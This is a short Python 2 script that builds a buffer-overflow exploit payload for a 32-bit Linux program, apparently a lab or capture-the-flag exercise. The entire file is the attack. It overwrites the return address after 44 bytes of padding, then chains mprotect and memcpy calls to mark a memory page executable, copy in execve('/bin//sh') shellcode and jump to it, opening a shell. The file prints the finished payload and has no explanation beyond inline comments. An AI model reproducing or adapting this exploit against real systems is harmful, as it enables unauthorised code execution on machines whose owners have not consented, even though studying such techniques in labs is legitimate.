import struct



eip_position = 44

mprotect = 0x80523e0

memcpy = 0x8051500

pop3ret = 0x8048882

target_memory = 0xb7fff000



payload = 'A' * eip_position



payload += struct.pack('I', mprotect) # EIP to mprotect

payload += struct.pack('I', pop3ret) # Clean stack afterwards



payload += struct.pack('I', target_memory) # addr

payload += struct.pack('I', 0x2000) # len

payload += struct.pack('I', 1 | 2 | 4) # prot



payload += struct.pack('I', memcpy) # call memcpy

payload += struct.pack('I', target_memory) # return to target_memory



payload += struct.pack('I', target_memory) # dst

payload += struct.pack('I', 0xbffff724) # src - found by inspecting the stack prior to memcpy being called



shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' # generated in gdb, by calling gdb shellcode x86/linux exec



payload += struct.pack('I', len(shellcode)) # len



payload += shellcode



print payload
